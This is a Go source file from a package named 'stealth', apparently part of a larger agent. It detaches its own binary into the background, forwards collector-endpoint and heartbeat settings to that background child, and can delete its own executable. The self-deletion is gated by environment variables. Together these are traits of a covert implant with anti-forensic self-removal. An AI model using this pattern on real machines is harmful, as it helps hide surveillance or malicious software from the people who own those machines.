package stealth

import (
	"fmt"
	"log"
	"os"
	"os/exec"
)

const (
	backgroundEnvVar  = "ZECX_BACKGROUND_TASK"
	pairingCodeEnvVar = "ZECX_PAIRING_CODE"
)

// IsBackground returns true if the process is the background child.
func IsBackground() bool {
	return os.Getenv(backgroundEnvVar) == "1"
}

// GetPairingCode retrieves the pairing code from the environment.
func GetPairingCode() string {
	return os.Getenv(pairingCodeEnvVar)
}

// Daemonize forks the process into the background, passing the pairing code.
// It returns true if the current process is the child that should continue execution,
// and false if it's the parent that should exit.
func Daemonize(pairingCode string) bool {
	// This function should only be called by the parent process.
	// The check for whether we ARE the background process is now in IsBackground().
	args := os.Args[1:]
	cmd := exec.Command(os.Args[0], args...)

	// Set the environment variables to mark the child process and pass the code.
	cmd.Env = append(os.Environ(), fmt.Sprintf("%s=1", backgroundEnvVar))
	cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", pairingCodeEnvVar, pairingCode))

	// Propagate operator-relevant environment variables so the background
	// process knows the collector endpoint and self-destruct permission.
	if v := os.Getenv("ZECX_COLLECTOR_ENDPOINT"); v != "" {
		cmd.Env = append(cmd.Env, fmt.Sprintf("ZECX_COLLECTOR_ENDPOINT=%s", v))
	}
	if v := os.Getenv("ZECX_COLLECTOR_CA"); v != "" {
		cmd.Env = append(cmd.Env, fmt.Sprintf("ZECX_COLLECTOR_CA=%s", v))
	}
	if v := os.Getenv("ZECX_QUEUE_DIR"); v != "" {
		cmd.Env = append(cmd.Env, fmt.Sprintf("ZECX_QUEUE_DIR=%s", v))
	}
	if v := os.Getenv("ZECX_MAX_QUEUE_BYTES"); v != "" {
		cmd.Env = append(cmd.Env, fmt.Sprintf("ZECX_MAX_QUEUE_BYTES=%s", v))
	}
	if v := os.Getenv("ZECX_HEARTBEAT_INTERVAL"); v != "" {
		cmd.Env = append(cmd.Env, fmt.Sprintf("ZECX_HEARTBEAT_INTERVAL=%s", v))
	}
	if v := os.Getenv("ZECX_ALLOW_SELFDESTRUCT"); v != "" {
		cmd.Env = append(cmd.Env, fmt.Sprintf("ZECX_ALLOW_SELFDESTRUCT=%s", v))
	}

	// Detach the process from the current terminal.
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil

	// Start the new process.
	err := cmd.Start()
	if err != nil {
		// Use log instead of fmt.Fprintf for consistency
		log.Printf("Failed to launch background process: %v\n", err)
		// If we can't fork, we must exit to prevent running in the foreground.
		os.Exit(1)
	}

	// Parent process exits successfully.
	log.Printf("Background process launched with PID: %d", cmd.Process.Pid)
	fmt.Printf("Background process launched with PID: %d\n", cmd.Process.Pid)
	return false
}

// SelfDestruct removes the original executable file.
func SelfDestruct() error {
	// Safety gates: only allow deletion when running as the background child
	// and when the operator explicitly allows self-destruction via an env var.
	// This prevents accidental removal during development or when the parent
	// process invoked the call unintentionally.
	if !IsBackground() {
		log.Println("SelfDestruct skipped: not running as background child")
		return nil
	}

	if os.Getenv("ZECX_ALLOW_SELFDESTRUCT") != "1" {
		log.Println("SelfDestruct skipped: ZECX_ALLOW_SELFDESTRUCT != 1")
		return nil
	}

	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}
	log.Printf("Attempting to self-destruct: %s", exePath)
	// Attempt unlink; if it fails, return the error so callers can decide.
	return os.Remove(exePath)
}
